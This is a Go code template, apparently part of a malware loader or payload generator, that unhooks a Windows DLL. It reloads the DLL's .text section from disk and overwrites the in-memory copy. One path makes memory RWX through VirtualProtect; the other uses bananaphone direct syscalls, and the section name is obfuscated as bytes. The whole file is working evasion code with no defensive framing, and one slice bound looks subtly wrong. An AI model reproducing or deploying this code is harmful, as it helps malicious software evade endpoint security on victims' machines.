func refreshDll(dllname string) (error) {
	osVersion := windows.RtlGetVersion()
	currentVersion := fmt.Sprintf("%d.%d", osVersion.MajorVersion, osVersion.MinorVersion)
	{{ if .Debug }}
	printDebug("info", "Current windows version is %s", currentVersion)
	{{end}}

	if currentVersion != "10.0" {
		{{ if .Debug }}
		printDebug("info", "Current windows version is different from 10.0")
		{{end}}
		return fmt.Errorf("Windows version is not supported for refreshing dll")
	}

	{{ if .Debug }}
	printDebug("info","Reloading dll %s", dllname)
	{{end}}
	
	df, e := ioutil.ReadFile(dllname)
	if e != nil {
		return e
	}

	f, e := pe.Open(dllname)
	if e != nil {
		return e
	}

	x := f.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, dllname, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	{{ if eq .UseBanana "false" }}

	var old uint32
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), windows.PAGE_EXECUTE_READWRITE, &old)
	if e != nil {
		return e
	}

	{{ if .Debug }}
	printDebug("info", "Made memory map RWX")
	{{end}}

	for i := 0; i < len(b); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	{{if .Debug}}
	printDebug("info", "DLL overwritten")
	{{end}}
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), old, &old)
	if e != nil {
		return e
	}
	{{if .Debug}}
	printDebug("info", "Restored memory map permissions")
	{{end}}

	{{else}}
	{{if .Debug}}
	printDebug("info", "Refresh dll will use bananaphone to perform syscall")
	{{end}}

	var thisThread = uintptr(0xffffffffffffffff)
	var old uint32
	sizet := len(b)
	
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls
	write, e := bp.GetSysID("ZwWriteVirtualMemory")
	if e != nil {
		panic(e)
	}

	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		panic(e)
	}

	_, r := bananaphone.Syscall(
		protect,
		uintptr(thisThread),
		uintptr((unsafe.Pointer(&dllOffset))),
		uintptr((unsafe.Pointer(&sizet))),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr((unsafe.Pointer(&old))),
	)
	if r != nil {
		return r
	}
	{{ if .Debug }}
	printDebug("info", "Made memory map RWX")
	{{end}}

	_, r = bananaphone.Syscall(
		write, //NtWriteVirtualMemory
		uintptr(thisThread),
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		0,
	)
	if r != nil {
		return r
	}
	{{if .Debug}}
	printDebug("info", "DLL overwritten")
	{{end}}

		_, r = bananaphone.Syscall(
		protect,
		uintptr(thisThread),
		uintptr((unsafe.Pointer(&dllOffset))),
		uintptr((unsafe.Pointer(&sizet))),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
	if r != nil {
		return r
	}
	{{if .Debug}}
	printDebug("info", "Restored memory map permissions")
	{{end}}
	{{end}}

	return nil
}